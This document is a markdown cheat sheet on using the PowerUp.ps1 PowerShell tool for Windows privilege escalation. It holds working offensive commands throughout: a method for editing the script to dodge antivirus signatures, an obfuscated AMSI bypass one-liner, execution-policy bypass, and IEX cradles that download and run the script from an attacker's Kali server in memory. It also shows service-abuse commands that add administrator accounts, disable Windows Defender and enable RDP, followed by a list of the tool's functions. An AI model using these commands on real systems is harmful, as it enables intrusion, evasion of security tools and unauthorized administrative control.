## PowerUp.ps1 
## Evade Anti-Virus
```
You may want to modify PowerUp.ps1. Anti-virus will read the script and flag it as malware.
Anti-virus signatures can rely on comments in the program to determine if the program is a “known threat”.
To do this, open up a text editor and load the PowerUp.ps1 file.
Apparently the signature McAfee uses to flag this file as “malware” is the comment at the top of the script.
Remove lines 1-9 from the file and save it.
```
## Bypassing AMSI and Disable Execution Policy
```
AMSI is a new security feature that Microsoft has put into PowerShell and Windows 10.
It uses a string based detection mechanism to detect “dangerous” commands and potentially malicious scripts.
PowerShell’s execution policy is a safety feature that controls the conditions under which PowerShell loads configuration files and runs scripts.
This feature helps prevent the execution of malicious scripts. Keep in mind though, that is to prevent “average users” from executing malicious scripts.
It’s not a security feature, it’s a safety feature. So you can simply disable this by typing in the following into a PowerShell console:
PS C:\> powershell -ep bypass

Now we have bypassed PowerShell’s execution policy, we need to disable AMSI.
Below is a good bypass for AMSI that hasn’t been patched by Microsoft yet.
Type this into the PowerShell console to bypass AMSI. There are several others out there, but this is my go-to:

sET-ItEM ( ‘V’+’aR’ + ‘IA’ + ‘blE:1q2’ + ‘uZx’ ) ( [TYpE]( “{1}{0}”-F’F’,’rE’ ) ) ; ( GeT-VariaBle ( “1Q2U” +”zX” ) -VaL ).”A`ss`Embly”.”GET`TY`Pe”(( “{6}{3}{1}{4}{2}{0}{5}” -f’Util’,’A’,’Amsi’,’.Management.’,’utomation.’,’s’,’System’ ) ).”g`etf`iElD”( ( “{0}{2}{1}” -f’amsi’,’d’,’InitFaile’ ),( “{2}{4}{0}{1}{3}” -f ‘Stat’,’i’,’NonPubli’,’c’,’c,’ )).”sE`T`VaLUE”( ${n`ULl},${t`RuE} )
```
## Import Module
```
Transfer the script and import the module:
PS C:\> Import-Module PowerUp.ps1

All the powerup cmdlets now are loaded and the tab completes. To get more information on any command use get-help -full eg.
Get-help Get-ServiceEXEPerms -full

we can now run any of the functions that are part of the PowerUp.ps1 module.
The one we are interested in is Invoke-AllChecks because it runs all the checks included in the module. To run it, we simply run that command as shown below:
powershell.exe -exec bypass -Command “& {Import-Module .\PowerUp.ps1; Invoke-AllChecks}”
```
## Invoke-AllChecks
## Invoke-ServiceAbuse -Name 'AbyssWebServer'
```
After we run the command, we will notice the output provides the command that PowerUp.ps1 executed.
It looks like it added the user john with a password of Password123! then it added that user to the administrator’s group.
Let’s confirm that this worked by typing in net user to view john
```
## Custom Abuse
```
PowerUp.ps1 provides us a way to customize the command to be run with LocalSystem privileges:
Adding a new user with password with -User and -Password options
Invoke-ServiceAbuse -Name 'AbyssWebServer' -User hacker -Password Password1337
Running a custom command (Disable Windows Defender):
Invoke-ServiceAbuse -Name 'AbyssWebServer' -Command "Set-MpPreference -DisableRealtimeMonitoring $true"
Running a custom command (Enable RDP services)PowerShell:
Invoke-ServiceAbuse -Name 'AbyssWebServer' -Command "reg add \"HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0 /f"
```
## Running PowerUp.ps1 Without Touching Disk
```
Generally anti-virus programs scan any file being written to disk and will immediately quarantine it before you can use it.
Anti-virus has a harder time detecting malware running in memory.
By importing PowerUp.ps1 without touching disk, we have a greater chance at bypassing anti-virus.

Loading From Your Kali Apache Server
PS C:\> IEX(New-Object Net.WebClient).DownloadString(‘http://<kali_ip>/PowerUp.ps1’)

PowerShell Version 3 And Above
PS C:\> iex (iwr 'http://<kali_ip>/PowerUp.ps1')

Alternative Method
PS C:\> $wr = [System.NET.WebRequest]::Create("http://<kali_ip>/PowerUp.ps1") 
PS C:\> $r = $wr.GetResponse()
PS C:\> IEX ([System.IO.StreamReader]($r.GetResponseStream())).ReadToEnd()
```
## Service Enumeration
```
Get-ServiceUnquoted                 -   returns services with unquoted paths that also have a space in the name
Get-ModifiableServiceFile           -   returns services where the current user can write to the service binary path or its config
Get-ModifiableService               -   returns services the current user can modify
Get-ServiceDetail                   -   returns detailed information about a specified service
```
## Service Abuse
```
Invoke-ServiceAbuse                 -   modifies a vulnerable service to create a local admin or execute a custom command
Write-ServiceBinary                 -   writes out a patched C# service binary that adds a local admin or executes commands
Install-ServiceBinary               -   replaces a service binary with one that adds a local admin or executes commands
Restore-ServiceBinary               -   restores a replaced service binary with the original executable
```

## DLL Hijacking
```
Find-ProcessDLLHijack               -   finds potential DLL hijacking opportunities for currently running processes
Find-PathDLLHijack                  -   finds service %PATH% DLL hijacking opportunities
Write-HijackDll                     -   writes out a hijackable DLL
```

## Registry Checks
```
Get-RegistryAlwaysInstallElevated   -  checks if the AlwaysInstallElevated registry key is set
Get-RegistryAutoLogon               -   checks for Autologon credentials in the registry
Get-ModifiableRegistryAutoRun       -   checks for any modifiable binaries/scripts (or their configs) in HKLM autoruns
```
## Miscellaneous Checks
```
Get-ModifiableScheduledTaskFile     -   find schtasks with modifiable target files
Get-UnattendedInstallFile           -   finds remaining unattended installation files
Get-Webconfig                       -   checks for any encrypted web.config strings
Get-ApplicationHost                 -   checks for encrypted application pool and virtual directory passwords
Get-SiteListPassword                -   retrieves the plaintext passwords for any found McAfee's SiteList.xml files
Get-CachedGPPPassword               -   checks for passwords in cached Group Policy Preferences files
```
## Other Helpers/Meta-Functions
```
Get-ModifiablePath                  -   tokenizes an input string and returns the files in it the current user can modify
Get-CurrentUserTokenGroupSid        -   returns all SIDs that the current user is a part of, whether they are disabled or not
Add-ServiceDacl                     -   adds a Dacl field to a service object returned by Get-Service
Set-ServiceBinPath                  -   sets the binary path for a service to a specified value through Win32 API methods
Test-ServiceDaclPermission          -   tests one or more passed services or service names against a given permission set
Write-UserAddMSI                    -   write out a MSI installer that prompts for a user to be added
Invoke-AllChecks                    -   runs all current escalation checks and returns a report
```











